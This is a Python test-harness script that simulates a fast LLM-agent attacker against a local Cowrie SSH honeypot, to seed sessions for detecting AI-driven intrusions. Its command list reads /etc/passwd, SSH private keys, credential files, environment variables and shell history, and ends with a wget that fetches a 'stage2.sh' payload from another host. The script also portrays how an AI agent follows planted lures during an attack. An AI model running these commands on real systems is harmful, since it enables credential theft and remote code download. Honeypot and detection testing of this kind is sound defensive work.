#!/usr/bin/env python3
"""seed_ai_attacker.py — CHIMERA P08 (verifier / test harness, NOT production).

Simulates an *LLM-agent* attacker against the Cowrie SSH honeypot. Whereas the
human seed (``seed_attacker.sh``) is slow and exploratory, the AI agent is FAST
and periodic: it logs in and rips through a goal-directed sequence of commands
that pursues planted lures (cats/greps credential-looking files, then "follows
the next step") with near-uniform, machine-like inter-command timing.

Tier-1 scope: this only needs to produce a *distinguishable, fast-paced* Cowrie
session. The timing/behavioral classification that consumes it lands in Tier 2;
here we just guarantee a clean, low-latency session lands in idx_honeypot. The
smoke test calls this OPTIONALLY and must never block on it.

Self-contained: prefers ``paramiko`` (real per-command timing control) if it is
importable, else falls back to a single ``ssh`` subprocess with a chained
command string. Standard library only otherwise.

Usage:
    python3 scripts/seed_ai_attacker.py            # one fast session
    python3 scripts/seed_ai_attacker.py --host 127.0.0.1 --port 2222

Exit code is always 0 unless invoked with --strict (then non-zero on failure);
the smoke test invokes it best-effort and ignores its result.
"""

from __future__ import annotations

import argparse
import shutil
import subprocess
import sys
import time

# Cowrie default userdb accepts root/toor.
DEFAULT_USER = "root"
DEFAULT_PASS = "toor"

# Goal-directed lure-following command plan. Fast, periodic, machine-like.
# These mimic an agent: enumerate, grab credential-looking files, follow a
# "next step" pointer left as a lure, then attempt lateral movement.
COMMAND_PLAN = [
    "id",
    "ls -la /root /home /etc 2>/dev/null",
    "cat /etc/passwd",
    "grep -ri password /etc 2>/dev/null | head",
    "cat /root/.ssh/id_rsa 2>/dev/null",
    "cat /root/credentials.txt 2>/dev/null",
    "cat /root/README_NEXT_STEP.txt 2>/dev/null",
    "env",
    "cat /root/.bash_history 2>/dev/null",
    "wget http://10.0.0.5/stage2.sh -O /tmp/s.sh 2>/dev/null",
]

# AI agents act fast and with near-uniform cadence (no human "thinking" jitter).
INTER_COMMAND_DELAY = 0.15  # seconds


def _log(msg: str) -> None:
    print(f"[seed_ai_attacker] {msg}", flush=True)


def _ssh_opts(port: int) -> list[str]:
    return [
        "-o", "StrictHostKeyChecking=no",
        "-o", "UserKnownHostsFile=/dev/null",
        "-o", "PreferredAuthentications=password",
        "-o", "PubkeyAuthentication=no",
        "-o", "ConnectTimeout=10",
        "-o", "LogLevel=ERROR",
        "-p", str(port),
    ]


def run_with_paramiko(host: str, port: int, user: str, password: str) -> bool:
    import paramiko  # type: ignore

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=host,
        port=port,
        username=user,
        password=password,
        look_for_keys=False,
        allow_agent=False,
        timeout=10,
        auth_timeout=10,
        banner_timeout=10,
    )
    try:
        start = time.monotonic()
        for cmd in COMMAND_PLAN:
            stdin, stdout, stderr = client.exec_command(cmd, timeout=10)
            stdout.read()  # drain so the command fully executes / is logged
            stderr.read()
            time.sleep(INTER_COMMAND_DELAY)
        _log(f"paramiko session done: {len(COMMAND_PLAN)} commands in "
             f"{time.monotonic() - start:.2f}s")
    finally:
        client.close()
    return True


def run_with_subprocess(host: str, port: int, user: str, password: str) -> bool:
    """Fallback: one ssh subprocess, commands chained with short sleeps.

    Requires ``sshpass`` for non-interactive password auth.
    """
    if shutil.which("sshpass") is None:
        _log("ERROR: neither paramiko nor sshpass available; cannot connect")
        return False

    # Chain the plan with fast, uniform sleeps to keep the machine-like cadence.
    chained = f"; sleep {INTER_COMMAND_DELAY}; ".join(COMMAND_PLAN) + "; exit"
    argv = (
        ["sshpass", "-p", password, "ssh"]
        + _ssh_opts(port)
        + [f"{user}@{host}", chained]
    )
    start = time.monotonic()
    try:
        proc = subprocess.run(
            argv,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            timeout=60,
            check=False,
        )
    except subprocess.TimeoutExpired:
        _log("ERROR: ssh subprocess timed out")
        return False
    _log(f"subprocess session done (rc={proc.returncode}) in "
         f"{time.monotonic() - start:.2f}s, {len(COMMAND_PLAN)} commands")
    return proc.returncode == 0


def main() -> int:
    ap = argparse.ArgumentParser(description="Simulate a fast LLM-agent SSH attacker against Cowrie.")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=2222)
    ap.add_argument("--user", default=DEFAULT_USER)
    ap.add_argument("--password", default=DEFAULT_PASS)
    ap.add_argument("--strict", action="store_true",
                    help="exit non-zero on failure (default: always exit 0)")
    args = ap.parse_args()

    _log(f"target={args.host}:{args.port} — fast/periodic agent session "
         f"({INTER_COMMAND_DELAY}s cadence, {len(COMMAND_PLAN)} commands)")

    ok = False
    try:
        try:
            import paramiko  # noqa: F401
            _log("using paramiko transport")
            ok = run_with_paramiko(args.host, args.port, args.user, args.password)
        except ImportError:
            _log("paramiko not installed; falling back to ssh subprocess")
            ok = run_with_subprocess(args.host, args.port, args.user, args.password)
    except Exception as e:  # noqa: BLE001 — best-effort seed; never crash the smoke test
        _log(f"session error: {e}")
        ok = False

    if ok:
        _log("AI attacker seed complete (src_ip recorded as docker gateway 172.30.0.1)")
    else:
        _log("AI attacker seed did not complete cleanly")

    if args.strict:
        return 0 if ok else 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
